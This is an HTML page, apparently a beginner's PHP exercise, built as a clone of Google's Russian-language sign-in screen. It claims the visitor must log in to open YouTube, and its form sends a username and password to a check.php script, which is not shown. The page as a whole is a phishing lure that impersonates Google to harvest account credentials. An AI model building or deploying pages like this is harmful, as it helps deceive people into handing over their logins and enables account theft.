<!-- 2 уровень -->
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>index php</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
</head>
<body>
	<div class="col-4 mx-auto mt-5">
		<div class="col-2 mx-auto ">
			<img src="img/logo.png" class="w-100">
		</div>
		<div class="text-center">
			<h1 class="font-weight-light">Один аккаунт. Весь мир Google!</h1>
			<p class="font-weight-light">Чтобы запустить YouTube, войдите в свой аккаунт</p>
		</div>
		<div class="col-8 bg-light mx-auto pt-5 shadow-sm mb-5" style="height: 400px">
			<div class="col-4 mx-auto mb-4">
				<img src="img/avatar.png" class="rounded-circle w-100">
			</div>
			<div class="col-9 mx-auto">
				<form action="check.php" method="POST">
					<input type="" name="username" class="form-control">
					<input type="" name="password" class="form-control">
					<button class="form-control mt-1 bg-primary">Далее</button>
				</form>				
				<div class="text-right">
					<a href="">Найти аккаунт</a>
				</div>				
			</div>
		</div>
		<div class="text-center">
			<a href="">Создать аккаунт</a>
		</div>		
	</div>
</body>
</html>